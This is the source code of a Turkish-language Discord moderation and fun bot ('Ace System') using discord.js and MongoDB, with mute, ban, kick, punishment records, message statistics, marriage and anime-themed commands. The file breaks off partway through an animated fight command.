const { Client, GatewayIntentBits, EmbedBuilder, Partials, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, AttachmentBuilder, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const http = require('http');
const mongoose = require('mongoose');
const ms = require('ms');
const Canvas = require('canvas');
let sonsuzlukAktif = false;

// ================== GLOBAL STATE ==================
let currentDomain = {
    active: false,
    owner: null,
    type: null,
    pinnedMsg: null,
    timeoutMsg: null,
    isClashing: false
};

// ================== HELPER ==================
const normalize = str =>
    str.normalize("NFD").replace(/[\u0300-\u036f]/g, "").toUpperCase();


const statSchema = new mongoose.Schema({
    guildID: String,
    userID: String,
    messageCount: { type: Number, default: 0 },
    voiceTime: { type: Number, default: 0 },
    lastVoiceJoin: { type: Number, default: 0 }
});
const Stats = mongoose.model('Stats', statSchema);

// --- 1. ROL VE KULLANICI AYARLARI ---
const prefix = "a!";
const logKanalAdi = "bot-log";
const OWNER_ID = "983015347105976390"; 

// Yetki Rolleri
const PERMS = {
    MUTE: "1492679768997363733",
    VMUTE: "1492674773132640406",
    BAN: "1492974570909597727",
    KICK: "1489799021710020788",
    SIL_SNIPE: "1492672722160062465",
    SICIL: "1493896995897872386",
    EVLI_ROL: "1493896447102423062"
};

// --- 2. VERİTABANI (MONGODB) MODELLERİ ---
mongoose.connect(process.env.MONGO_URL, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log("[MongoDB] Veritabanı bağlandı! Ace System Aktif!"))
    .catch(err => console.error("[MongoDB] Hata:", err));

// Sicil Şeması
const sicilSchema = new mongoose.Schema({
    kullaniciID: String,
    yetkiliID: String,
    islem: String, // Chat Mute, Voice Mute, Kick, Ban
    sebep: String,
    sure: String,
    tarih: { type: Date, default: Date.now }
});
const Sicil = mongoose.model('Sicil', sicilSchema);

const evlilikSchema = new mongoose.Schema({
    kullanici1: String,
    kullanici2: String,
    tarih: { type: Date, default: Date.now }
});
const Evlilik = mongoose.model('Evlilik', evlilikSchema);

// --- 3. BOT KURULUMU ---
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildVoiceStates
    ],
    partials: [Partials.Message, Partials.Channel, Partials.Reaction]
});

const snipes = new Map();

http.createServer((req, res) => {
    res.write("Bot 7/24 Aktif! - Ace System");
    res.end();
}).listen(process.env.PORT || 3000);

client.on('clientReady', () => {
    console.log(`[BAŞARILI] ${client.user.tag} aktif! (Ace System)`);
    client.user.setActivity('a!yardım | 🛡️ Ace System', { type: 0 });
});

// Mesaj Sayar
client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.guild) return;
    await Stats.findOneAndUpdate(
        { guildID: message.guild.id, userID: message.author.id },
        { $inc: { messageCount: 1 } },
        { upsert: true }
    );
});

// Ses Süresi Sayar
client.on('voiceStateUpdate', async (oldState, newState) => {
    const userID = oldState.id || newState.id;
    const guildID = oldState.guild.id;

    if (!oldState.channelId && newState.channelId) {
        await Stats.findOneAndUpdate({ guildID, userID }, { lastVoiceJoin: Date.now() }, { upsert: true });
    }
    else if (oldState.channelId && !newState.channelId) {
        const data = await Stats.findOne({ guildID, userID });
        if (data && data.lastVoiceJoin > 0) {
            const diff = Date.now() - data.lastVoiceJoin;
            await Stats.findOneAndUpdate(
                { guildID, userID },
                { $inc: { voiceTime: diff }, lastVoiceJoin: 0 }
            );
        }
    }
});

// --- 4. SNIPE VE LOG SİSTEMİ ---
client.on('messageDelete', async message => {
    if (message.author?.bot || !message.guild) return;

    snipes.set(message.channel.id, {
        content: message.content,
        author: message.author,
        image: message.attachments.first() ? message.attachments.first().proxyURL : null,
        timestamp: Date.now()
    });

    const logChannel = message.guild.channels.cache.find(c => c.name === logKanalAdi);
    if (logChannel) {
        const logEmbed = new EmbedBuilder()
            .setColor('#ff3333')
            .setTitle('🗑️ Mesaj Silindi')
            .addFields(
                { name: 'Kullanıcı', value: `${message.author.tag}`, inline: true },
                { name: 'Kanal', value: `<#${message.channel.id}>`, inline: true },
                { name: 'Mesaj', value: message.content || 'İçerik yok (Resim vb.)' }
            )
            .setFooter({ text: '🛡️ Ace System Logger', iconURL: client.user.displayAvatarURL() })
            .setTimestamp();
        logChannel.send({ embeds: [logEmbed] }).catch(() => {});
    }
});

// --- 5. KOMUTLAR ---
client.on('messageCreate', async message => {
    if (message.author.bot || !message.guild) return;

    // 1. SONSUZLUK KONTROLÜ (Prefix kontrolünden ÖNCE olmalı)
    if (sonsuzlukAktif && message.mentions.has('983015347105976390') && message.author.id !== '983015347105976390') {
        const embed = {
            color: 0x00AEFF,
            title: '🤞 Dokunulmazlık!',
            description: `**"${message.author.username}, Ace'e ulaşmaya çalışıyorsun ama aranızda sonsuzluk var. Boşuna çabalama."**`,
            image: {
                url: 'https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3ZGM3ZTh1eTI5dnMxMG5henpxMnA1cnI5bTV3cnRteDh4ank2amliZCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/jjGbTjAq9TSUmP0rkG/giphy.gif'
            }
        };
        return message.reply({ embeds: [embed] });
    }

    // 2. PREFİX KONTROLÜ (Buradan aşağısı sadece komutlar için)
    if (!message.content.startsWith(prefix)) return;

    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    const yetkiVarMi = (rolID) => {
        return message.author.id === message.guild.ownerId || message.author.id === OWNER_ID || message.member.roles.cache.has(rolID);
    };

    // ====================== YARDIM ======================
   if (command === 'yardım') {
    const elitEmbed = new EmbedBuilder()
        .setColor('#2b2d31') 
        .setAuthor({ name: `${client.user.username} • Komut Menüsü`, iconURL: client.user.displayAvatarURL() })
        .setThumbnail(message.guild.iconURL({ dynamic: true }))
        .setDescription(
            `> 🛡️ **Gelişmiş Güvenlik ve Eğlence sistemine hoş geldin.**\n` +
            `> Aşağıdaki kategorilerden botun özelliklerini inceleyebilirsin.\n\n` +
            `**✨ İstatistikler:**\n` +
            `┕ 🏓 **Ping:** \`${client.ws.ping}ms\` | 👥 **Kullanıcı:** \`${message.guild.memberCount}\``
        )
        .addFields(
            { 
                name: '🎭 Üye/Eğlence Komutları', 
                value: '```fix\na!aşkölç | a!evlen | a!boşan | a!evlilik\na!kedisev | a!patlat | a!zarat | a!yazıtura\na!kaçcm | a!stat | a!leaderstat```', 
                inline: false 
            },
            { 
                name: '🛡️ Moderasyon Sistemi (Gelişmiş)', 
                value: '```yaml\na!mute [süre] [sebep]   | a!unmute [@kişi]\na!vmute [süre] [sebep]  | a!unvmute [@kişi]\na!ban [sebep]           | a!unban [ID]\na!kick [sebep]```', 
                inline: false 
            },
            { 
                name: '⚙️ Yönetim & Sistem', 
                value: '```diff\n+ a!sicil | a!sil | a!snipe```', 
                inline: false 
            }
        )
        .setFooter({ text: `🛡️ Ace System / Kara System • ${message.author.username} tarafından istendi.`, iconURL: message.author.displayAvatarURL({ dynamic: true }) })
        .setTimestamp();

    // SADECE SENİN GÖREBİLECEĞİN ÖZEL ALAN (GÜNCELLENDİ)
    if (message.author.id === '983015347105976390' || message.author.id === OWNER_ID) {
        elitEmbed.addFields({ 
            name: '👑 Ace Özel', 
            value: '`a!hollowpurple` | `a!sonsuzluk` | `a!domainexpansion` | `a!domainclose` | `a!ceza-menü`', 
            inline: false 
        });
    }

    return message.reply({ embeds: [elitEmbed] });
}

    // ====================== SİL VE SNIPE ======================
    if (command === 'sil') {
        if (!yetkiVarMi(PERMS.SIL_SNIPE)) return message.reply("❌ Bu komutu kullanmak için yetkin yok.\n*🛡️ Ace System*");
        const miktar = parseInt(args[0]);
        if (isNaN(miktar) || miktar < 1 || miktar > 100) return message.reply("Lütfen 1-100 arası geçerli bir sayı gir.");
        await message.channel.bulkDelete(miktar, true);
        return message.channel.send(`🧹 **${miktar}** mesaj temizlendi!\n*🛡️ Ace System*`).then(m => setTimeout(() => m.delete(), 3000));
    }

    if (command === 'snipe') {
        if (!yetkiVarMi(PERMS.SIL_SNIPE)) return message.reply("❌ Bu komutu kullanmak için yetkin yok.");
        const msg = snipes.get(message.channel.id);
        if (!msg) return message.reply("Burada henüz silinen bir mesaj yok.");

        const snipeEmbed = new EmbedBuilder()
            .setAuthor({ name: msg.author.tag, iconURL: msg.author.displayAvatarURL() })
            .setColor('#2b2d31')
            .setDescription(`**Mesaj İçeriği:**\n${msg.content || "*İçerik yok*"}`)
            .setFooter({ text: '🛡️ Ace System Snipe Arşivi' })
            .setTimestamp(msg.timestamp);

        if (msg.image) snipeEmbed.setImage(msg.image);
        return message.reply({ embeds: [snipeEmbed] });
    }

    // ====================== MODERASYON: MUTE & UNMUTE ======================
    if (command === 'mute') {
// 1. ÖNCE TARGET'I TANIMLA (Zorunlu!)
    const target = message.mentions.members.first();

    // 2. SONRA SAHİP KONTROLÜNÜ YAP
    if (target && target.id === '983015347105976390') {
        return message.reply("⛔ **Hoppala!** Bu kullanıcı botun sahibi. Onu susturmaya ne senin yetkin yeter, ne de benim gücüm! 😉");
    }
        if (!yetkiVarMi(PERMS.MUTE)) return message.reply("❌ Yetkin yok aslanım.");
        const sure = args[1];
        const sebep = args.slice(2).join(' ') || "Belirtilmedi";

        if (!target) return message.reply("Kimi susturacağız? `a!mute @kişi 10m Küfür`");
        if (!sure || !ms(sure)) return message.reply("Geçerli bir süre gir (Örn: 10m, 1h, 1d).");

        try {
            await target.timeout(ms(sure), sebep); 
            await new Sicil({ kullaniciID: target.id, yetkiliID: message.author.id, islem: 'Chat Mute', sebep, sure }).save();
            return message.reply(`🤐 **${target.user.tag}** adlı kullanıcı **${sure}** boyunca susturuldu. \n📝 Sebep: ${sebep}\n*🛡️ Ace System*`);
        } catch (e) {
            return message.reply("Kullanıcıyı susturamıyorum, yetkim ondan düşük olabilir.");
        }
    }

    if (command === 'unmute') {
        // 1. ÖNCE TARGET'I TANIMLA (Zorunlu!)
    const target = message.mentions.members.first();

    // 2. SONRA SAHİP KONTROLÜNÜ YAP
    if (target && target.id === '983015347105976390') {
        return message.reply("⛔ **Hoppala!** Bu kullanıcı botun sahibi. Onu susturmaya ne senin yetkin yeter, ne de benim gücüm! 😉");
    }
        if (!yetkiVarMi(PERMS.MUTE)) return message.reply("❌ Yetkin yok aslanım.");
        if (!target) return message.reply("Kimin susturmasını açacağız? `a!unmute @kişi`");

        try {
            await target.timeout(null, "Unmute by " + message.author.tag);
            // Sicilden en son atılan Chat Mute cezasını sil
            await Sicil.findOneAndDelete({ kullaniciID: target.id, islem: 'Chat Mute' }, { sort: { tarih: -1 } });
            return message.reply(`✅ **${target.user.tag}** adlı kullanıcının metin susturması kaldırıldı ve sicilinden temizlendi!\n*🛡️ Ace System*`);
        } catch (e) {
            return message.reply("İşlem başarısız.");
        }
    }

    // ====================== MODERASYON: VMUTE & UNVMUTE ======================
    if (command === 'vmute') {
        // 1. ÖNCE TARGET'I TANIMLA (Zorunlu!)
    const target = message.mentions.members.first();

    // 2. SONRA SAHİP KONTROLÜNÜ YAP
    if (target && target.id === '983015347105976390') {
        return message.reply("⛔ **Hoppala!** Bu kullanıcı botun sahibi. Onu susturmaya ne senin yetkin yeter, ne de benim gücüm! 😉");
    }
        if (!yetkiVarMi(PERMS.VMUTE)) return message.reply("❌ Sesli mute yetkin yok.");
        const sure = args[1];
        const sebep = args.slice(2).join(' ') || "Belirtilmedi";

        if (!target) return message.reply("Kimi susturacağız? `a!vmute @kişi 10m Trol`");
        if (!sure || !ms(sure)) return message.reply("Geçerli bir süre gir (Örn: 10m, 1h).");

        if (target.voice.channel) {
            await target.voice.setMute(true, sebep);
            await new Sicil({ kullaniciID: target.id, yetkiliID: message.author.id, islem: 'Voice Mute', sebep, sure }).save();
            message.reply(`🎙️ **${target.user.tag}** seste **${sure}** boyunca susturuldu.\n📝 Sebep: ${sebep}\n*🛡️ Ace System*`);
            
            setTimeout(() => {
                if (target.voice.channel) target.voice.setMute(false);
            }, ms(sure));
        } else {
            return message.reply("Kullanıcı şu an seste değil.");
        }
    }

    if (command === 'unvmute') {
        // 1. ÖNCE TARGET'I TANIMLA (Zorunlu!)
    const target = message.mentions.members.first();

    // 2. SONRA SAHİP KONTROLÜNÜ YAP
    if (target && target.id === '983015347105976390') {
        return message.reply("⛔ **Hoppala!** Bu kullanıcı botun sahibi. Onu susturmaya ne senin yetkin yeter, ne de benim gücüm! 😉");
    }
        if (!yetkiVarMi(PERMS.VMUTE)) return message.reply("❌ Sesli mute yetkin yok.");
        if (!target) return message.reply("Kimin ses susturmasını açacağız? `a!unvmute @kişi`");

        if (target.voice.channel) {
            await target.voice.setMute(false, "Unvmute by " + message.author.tag);
        }
        await Sicil.findOneAndDelete({ kullaniciID: target.id, islem: 'Voice Mute' }, { sort: { tarih: -1 } });
        return message.reply(`✅ **${target.user.tag}** adlı kullanıcının ses susturması kaldırıldı ve sicilinden temizlendi!\n*🛡️ Ace System*`);
    }

    // ====================== MODERASYON: BAN & UNBAN & KICK ======================
    if (command === 'ban') {
        // 1. ÖNCE TARGET'I TANIMLA (Zorunlu!)
    const target = message.mentions.members.first();

    // 2. SONRA SAHİP KONTROLÜNÜ YAP
    if (target && target.id === '983015347105976390') {
        return message.reply("⛔ **Hoppala!** Bu kullanıcı botun sahibi. Onu susturmaya ne senin yetkin yeter, ne de benim gücüm! 😉");
    }
        if (!yetkiVarMi(PERMS.BAN)) return message.reply("❌ Ban yetkin yok.");
        const sebep = args.slice(1).join(' ') || "Belirtilmedi";
        
        if (!target) return message.reply("Kimi banlayacağız?");
        
        await target.ban({ reason: sebep });
        await new Sicil({ kullaniciID: target.id, yetkiliID: message.author.id, islem: 'Ban', sebep, sure: 'Sınırsız' }).save();
        return message.reply(`🔨 **${target.user.tag}** sunucudan yasaklandı. \n📝 Sebep: ${sebep}\n*🛡️ Ace System*`);
    }

    if (command === 'unban') {
        if (!yetkiVarMi(PERMS.BAN)) return message.reply("❌ Ban yetkin yok.");
        const targetID = args[0];
        
        if (!targetID) return message.reply("Banını açacağın kişinin ID'sini girmelisin. `a!unban <ID>`");

        try {
            await message.guild.members.unban(targetID);
            await Sicil.findOneAndDelete({ kullaniciID: targetID, islem: 'Ban' }, { sort: { tarih: -1 } });
            return message.reply(`✅ \`${targetID}\` ID'li kullanıcının banı başarıyla açıldı ve sicilinden temizlendi!\n*🛡️ Ace System*`);
        } catch (err) {
            return message.reply("Bu ID'ye sahip banlı bir kullanıcı bulamadım veya yetkim yetmiyor.");
        }
    }

    if (command === 'kick') {
        // 1. ÖNCE TARGET'I TANIMLA (Zorunlu!)
    const target = message.mentions.members.first();

    // 2. SONRA SAHİP KONTROLÜNÜ YAP
    if (target && target.id === '983015347105976390') {
        return message.reply("⛔ **Hoppala!** Bu kullanıcı botun sahibi. Onu susturmaya ne senin yetkin yeter, ne de benim gücüm! 😉");
    }
        if (!yetkiVarMi(PERMS.KICK)) return message.reply("❌ Kick yetkin yok.");
        const sebep = args.slice(1).join(' ') || "Belirtilmedi";
        
        if (!target) return message.reply("Kimi atacağız?");

        await target.kick(sebep);
        await new Sicil({ kullaniciID: target.id, yetkiliID: message.author.id, islem: 'Kick', sebep, sure: '-' }).save();
        return message.reply(`👢 **${target.user.tag}** sunucudan atıldı. \n📝 Sebep: ${sebep}\n*🛡️ Ace System*`);
    }

    // ====================== GELİŞMİŞ SİCİL SİSTEMİ ======================
    if (command === 'sicil') {
        if (!yetkiVarMi(PERMS.SICIL)) return message.reply("❌ Sicil görüntüleme yetkin yok.");
        const target = message.mentions.users.first() || message.author;

        const data = await Sicil.find({ kullaniciID: target.id }).sort({ tarih: -1 }).limit(10);
        const totalCeza = await Sicil.countDocuments({ kullaniciID: target.id });

        if (!data || data.length === 0) {
            return message.reply({ 
                embeds: [new EmbedBuilder().setColor('#00ff00').setDescription(`✨ **${target.username}** adlı kullanıcının sicili tertemiz!`).setFooter({ text: '🛡️ Ace System', iconURL: client.user.displayAvatarURL() })]
            });
        }

        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setAuthor({ name: `${target.username} Adlı Kullanıcının Sicil Kaydı`, iconURL: target.displayAvatarURL() })
            .setDescription(`> ⚠️ Kullanıcının veritabanında toplam **${totalCeza}** ceza kaydı bulunuyor. Son 10 kayıt aşağıda listelenmiştir:\n\n` + 
                data.map((kayit, index) => {
                    const yetkili = message.guild.members.cache.get(kayit.yetkiliID);
                    const yetkiliAd = yetkili ? `<@${yetkili.id}>` : "Bilinmeyen Yetkili";
                    const icon = kayit.islem.includes('Mute') ? '🤐' : kayit.islem === 'Ban' ? '🔨' : '👢';
                    return `**${index + 1}.** ${icon} **[${kayit.islem}]**\n┕ **Yetkili:** ${yetkiliAd} | **Süre:** \`${kayit.sure}\` | **Tarih:** <t:${Math.floor(new Date(kayit.tarih).getTime() / 1000)}:R>\n┕ **Sebep:** *${kayit.sebep}*`;
                }).join('\n\n')
            )
            .setFooter({ text: '🛡️ Ace System • Modern Moderasyon', iconURL: client.user.displayAvatarURL() })
            .setTimestamp();

        return message.reply({ embeds: [embed] });
    }

    // ====================== YENİ EĞLENCE: KAÇ CM, ZAR AT, YAZI TURA ======================
    if (command === 'kaçcm') {
        const target = message.mentions.users.first() || message.author;
        const uzunluk = Math.floor(Math.random() * 35) + 1; // 1 ile 35 arası
        
        let yorum = "";
        if(uzunluk <= 5) yorum = "Büyü de gel aslanım... 🔬";
        else if(uzunluk <= 10) yorum = "İdare eder kardeşim, sıkma canını. 🤏";
        else if(uzunluk <= 16) yorum = "Ortalama, ideal. 😎";
        else if(uzunluk <= 23) yorum = "Oha, maşallah! 😳";
        else yorum = "Silah taşıma ruhsatı alman lazım usta! 🚀";

        const cmEmbed = new EmbedBuilder()
            .setColor('Random')
            .setTitle('📏 Ölçüm Sonucu')
            .setDescription(`> **${target.username}** adlı kişinin aleti tam olarak **${uzunluk} CM!**\n\n${yorum}`)
            .setFooter({ text: '🛡️ Ace System • Sadece Eğlence Amaçlıdır', iconURL: client.user.displayAvatarURL() });

        return message.reply({ embeds: [cmEmbed] });
    }

    if (command === 'zarat') {
        const zar = Math.floor(Math.random() * 6) + 1;
        return message.reply(`🎲 Zarları fırlattın ve **${zar}** geldi!\n*🛡️ Ace System*`);
    }

    if (command === 'yazıtura') {
        const sonuc = Math.random() < 0.5 ? "Yazı 🪙" : "Tura 🦅";
        return message.reply(`Havaya bir bozuk para attın...\nVe sonuç: **${sonuc}**\n*🛡️ Ace System*`);
    }

    // ====================== EĞLENCE (ESKİLER) ======================
    if (command === 'evlen') {
        const target = message.mentions.users.first();
        if (!target) return message.reply("Kiminle evlenmek istiyorsun?");
        if (target.id === message.author.id) return message.reply("Kendi kendinle evlenemezsin!");

        const evliMi = await Evlilik.findOne({ $or: [{ kullanici1: message.author.id }, { kullanici2: message.author.id }] });
        if (evliMi) return message.reply("Zaten evlisin!");
        const karsiEvliMi = await Evlilik.findOne({ $or: [{ kullanici1: target.id }, { kullanici2: target.id }] });
        if (karsiEvliMi) return message.reply("Teklif ettiğin kişi zaten evli!");

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('evet_evlen').setLabel('Evet!').setStyle(ButtonStyle.Success).setEmoji('💍'),
            new ButtonBuilder().setCustomId('hayir_evlen').setLabel('Hayır').setStyle(ButtonStyle.Danger).setEmoji('💔')
        );

        const teklifMsg = await message.channel.send({ 
            content: `Hey ${target}, **${message.author.username}** sana evlilik teklifi ediyor! Kabul ediyor musun?`, 
            components: [row] 
        });

        const filter = i => i.user.id === target.id;
        const collector = teklifMsg.createMessageComponentCollector({ filter, time: 60000 });

        collector.on('collect', async i => {
            if (i.customId === 'evet_evlen') {
                await new Evlilik({ kullanici1: message.author.id, kullanici2: target.id }).save();
                
                const rol = message.guild.roles.cache.get(PERMS.EVLI_ROL);
                if (rol) {
                    message.member.roles.add(rol).catch(()=>{});
                    const targetMember = message.guild.members.cache.get(target.id);
                    if (targetMember) targetMember.roles.add(rol).catch(()=>{});
                }

                await i.update({ content: `🎉 Tebrikler! **${message.author.username}** ve **${target.username}** artık resmen evli! 💍\n*🛡️ Ace System*`, components: [] });
            } else {
                await i.update({ content: `💔 Ahbeee! **${target.username}**, evlilik teklifini reddetti. Geçmiş olsun...\n*🛡️ Ace System*`, components: [] });
            }
        });

        collector.on('end', collected => {
            if (collected.size === 0) teklifMsg.edit({ content: "⏳ Evlilik teklifi zaman aşımına uğradı.", components: [] });
        });
    }

    if (command === 'boşan') {
        const kayit = await Evlilik.findOne({ 
            $or: [{ kullanici1: message.author.id }, { kullanici2: message.author.id }] 
        });

        if (!kayit) return message.reply("😕 Zaten evli değilsin ki boşanalım?");

        const partnerID = kayit.kullanici1 === message.author.id ? kayit.kullanici2 : kayit.kullanici1;
        const partner = await message.guild.members.fetch(partnerID).catch(() => null);

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('evet_bosan').setLabel('Evet, Boşanalım').setStyle(ButtonStyle.Danger).setEmoji('💔'),
            new ButtonBuilder().setCustomId('hayir_bosan').setLabel('Hayır, Vazgeçtim').setStyle(ButtonStyle.Secondary).setEmoji('❤️')
        );

        const bosanMsg = await message.reply({
            content: `💔 **${message.author.username}**, <@${partnerID}> ile boşanmak istediğini söylüyor.\nGerçekten boşanmak istiyor musun?`,
            components: [row]
        });

        const filter = i => i.user.id === message.author.id;
        const collector = bosanMsg.createMessageComponentCollector({ filter, time: 60000 });

        collector.on('collect', async i => {
            if (i.customId === 'evet_bosan') {
                await Evlilik.deleteOne({ _id: kayit._id });

                const evliRol = message.guild.roles.cache.get(PERMS.EVLI_ROL);
                if (evliRol) {
                    message.member.roles.remove(evliRol).catch(() => {});
                    if (partner) partner.roles.remove(evliRol).catch(() => {});
                }

                await i.update({ content: `💔 **${message.author.username}** ve <@${partnerID}> resmen boşandı...\n*🛡️ Ace System*`, components: [] });
            } else {
                await i.update({ content: `❤️ Boşanma iptal edildi. Hâlâ evlisin! 💍\n*🛡️ Ace System*`, components: [] });
            }
        });

        collector.on('end', collected => {
            if (collected.size === 0) bosanMsg.edit({ content: "⏳ Boşanma talebi zaman aşımına uğradı.", components: [] }).catch(() => {});
        });
    }

    if (command === 'evlilik') {
        const kayit = await Evlilik.findOne({ $or: [{ kullanici1: message.author.id }, { kullanici2: message.author.id }] });
        if (!kayit) return message.reply("Şu an kimseyle evli değilsin.");

        const partnerID = kayit.kullanici1 === message.author.id ? kayit.kullanici2 : kayit.kullanici1;
        const tarih = Math.floor(kayit.tarih.getTime() / 1000); 
        return message.reply(`💍 <@${partnerID}> ile <t:${tarih}:R> evlendin!\n*🛡️ Ace System*`);
    }

    if (command === 'kedisev') {
        try {
            const res = await fetch('https://api.thecatapi.com/v1/images/search');
            const data = await res.json();
            const kediEmbed = new EmbedBuilder()
                .setColor('#f39c12')
                .setTitle('🐈 Kediciği Çok Sevdin!')
                .setDescription(`> **${message.author.username}**, bir kediciği başını okşayarak sevdin!`)
                .setImage(data[0].url)
                .setFooter({ text: '🛡️ Ace System • Miyav!', iconURL: client.user.displayAvatarURL() })
                .setTimestamp();
            return message.reply({ embeds: [kediEmbed] });
        } catch (error) {
            return message.reply("🐈 Kediciği tam sevecektin ki kaçtı! (Fotoğraf yüklenemedi)");
        }
    }

    if (command === 'stat') {
        const target = message.mentions.users.first() || message.author;
        const data = await Stats.findOne({ guildID: message.guild.id, userID: target.id });

        if (!data) return message.reply("⚠️ Henüz kaydedilmiş bir istatistik bulunamadı.");

        const toplamSaniye = Math.floor(data.voiceTime / 1000);
        const saat = Math.floor(toplamSaniye / 3600);
        const dakika = Math.floor((toplamSaniye % 3600) / 60);

        const statEmbed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setAuthor({ name: `${target.username} İstatistikleri`, iconURL: target.displayAvatarURL({ dynamic: true }) })
            .setThumbnail(target.displayAvatarURL({ dynamic: true, size: 512 }))
            .addFields(
                { name: '💬 Mesaj İstatistiği', value: `\`\`\`fix\n${data.messageCount} Mesaj\`\`\``, inline: true },
                { name: '🔊 Ses İstatistiği', value: `\`\`\`fix\n${saat} Saat, ${dakika} Dakika\`\`\``, inline: true }
            )
            .setFooter({ text: '🛡️ Ace System • Veriler anlıktır.', iconURL: client.user.displayAvatarURL() })
            .setTimestamp();

        return message.reply({ embeds: [statEmbed] });
    }

    if (command === 'leaderstat') {
    // Veritabanından tüm verileri çek ve büyükten küçüğe sırala
    const allData = await Stats.find({ guildID: message.guild.id });

    if (!allData || allData.length === 0) 
        return message.reply("⚠️ Henüz sıralama oluşturacak veri bulunamadı.");

    // Mesaj ve Ses için ayrı listeler oluşturup sıralayalım (Top 15)
    const msgTop = [...allData].sort((a, b) => b.messageCount - a.messageCount).slice(0, 15);
    const voiceTop = [...allData].sort((a, b) => b.voiceTime - a.voiceTime).slice(0, 15);

    // Mesaj Sıralamasını Formatla
    const msgList = msgTop.map((data, index) => {
        return `**${index + 1}.** <@${data.userID}>: \`${data.messageCount} Mesaj\``;
    }).join('\n');

    // Ses Sıralamasını Formatla
    const voiceList = voiceTop.map((data, index) => {
        const toplamSaniye = Math.floor(data.voiceTime / 1000);
        const saat = Math.floor(toplamSaniye / 3600);
        const dakika = Math.floor((toplamSaniye % 3600) / 60);
        return `**${index + 1}.** <@${data.userID}>: \`${saat}s ${dakika}dk\``;
    }).join('\n');

    const leaderboardEmbed = new EmbedBuilder()
        .setColor('#2b2d31')
        .setTitle(`🏆 ${message.guild.name} Sunucu Sıralaması`)
        .addFields(
            { name: '💬 Mesaj Liderleri (Top 15)', value: msgList || 'Veri yok.', inline: true },
            { name: '🔊 Ses Liderleri (Top 15)', value: voiceList || 'Veri yok.', inline: true }
        )
        .setFooter({ text: '🛡️ Ace System • Genel Sıralama', iconURL: client.user.displayAvatarURL() })
        .setTimestamp();

    return message.reply({ embeds: [leaderboardEmbed] });
}


    if (command === 'gojovssukuna') {
    // Daha güçlü cache kırıcı (Giphy için de mükemmel çalışıyor)
    const fix = (url) => `${url}?v=${Date.now()}${Math.random().toString(36).slice(2)}`;

    const anaMesaj = await message.reply({
        embeds: [
            new EmbedBuilder()
                .setTitle('⚔️ SHINJUKU SHOWDOWN')
                .setDescription('**Gojo Satoru** vs **Ryomen Sukuna**\n\nİki efsane karşı karşıya... Kim kazanacak?')
                .setColor('#0a0a0a')
                .setImage(fix('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMWI4NXA4cGQ3NXhnNW0wYmRyamk0ZDhxaXFvaTY5MXJiZ2NyemljciZlcD12MV9naWZzX3NlYXJjaCZjdD1n/qQC8JPGoSvNWZ4GI26/giphy.gif'))
                .setFooter({ text: 'Savaş başlıyor... ⏳' })
        ]
    });

    // AŞAMA 1 - 0s → 4s
    setTimeout(async () => {
        await anaMesaj.edit({
            embeds: [
                new EmbedBuilder()
                    .setTitle('⚡ GÜÇLER UYANIYOR')
                    .setDescription('Gojo göz bandını indiriyor... Sukuna sırıtıyor.\nCursed energy Shinjuku’yu sarıyor!')
                    .setColor('#00ccff')
                    .setImage(fix('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMWI4NXA4cGQ3NXhnNW0wYmRyamk0ZDhxaXFvaTY5MXJiZ2NyemljciZlcD12MV9naWZzX3NlYXJjaCZjdD1n/xxSprBorM4fVvhjeFQ/giphy.gif'))
                    .setFooter({ text: 'Enerji patlaması yaklaşıyor... ⚡' })
            ]
        }).catch(() => {});
    }, 4000);

    // AŞAMA 2 - 4s → 9s
    setTimeout(async () => {
        await anaMesaj.edit({
            embeds: [
                new EmbedBuilder()
                    .setTitle('💥 İLK ÇARPIŞMA')
                    .setDescription('Yumruklar, tekme ve teknikler havada!\nBinalar yerle bir oluyor...')
                    .setColor('#ff3300')
                    .setImage(fix('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMWI4NXA4cGQ3NXhnNW0wYmRyamk0ZDhxaXFvaTY5MXJiZ2NyemljciZlcD12MV9naWZzX3NlYXJjaCZjdD1n/QSwBid1bso4h5ePFnN/giphy.gif'))
                    .setFooter({ text: 'Şok dalgaları her yeri yıkıyor... 💥' })
            ]
        }).catch(() => {});
    }, 10000);

    // AŞAMA 3 - 9s → 14s (En epik kısım)
    setTimeout(async () => {
        await anaMesaj.edit({
            embeds: [
                new EmbedBuilder()
                    .setTitle('🌀 DOMAIN EXPANSION ÇARPIŞMASI')
                    .setDescription('**Infinite Void** vs **Malevolent Shrine**\nGerçeklik parçalanıyor!')
                    .setColor('#9933ff')
                    .setImage(fix('https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3cDE5NzhpZTFvODZlbWI4d2Q2eXdmemluenpkdHRoOHVjYmtyY2FsZCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/Nz0Pr7zKU459KXwbwb/giphy.gif'))
                    .setFooter({ text: 'Alanlar birbirini yok ediyor... 🌀' })
            ]
        }).catch(() => {});
    }, 17000);

    // AŞAMA 4 - 14s → 19s
    setTimeout(async () => {
        await anaMesaj.edit({
            embeds: [
                new EmbedBuilder()
                    .setTitle('🔥 FİNAL TEKNİKLER')
                    .setDescription('**Gojo:** Hollow Purple\n**Sukuna:** World Slash + Cleave\nHer şey bu anda belli olacak!')
                    .setColor('#cc00ff')
                    .setImage(fix('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZm92b2Fzc3p1YmNsZGVvOGFjNmpkMWFjeXJvcXR5bWVrMHc4d2NleSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/r77sc23Jo1AhlB0uQh/giphy.gif')) // Hollow Purple için en iyi alternatif (daha iyi GIF bulursam değiştiririz)
                    .setFooter({ text: 'Son darbe geliyor... ⚔️' })
            ]
        }).catch(() => {});
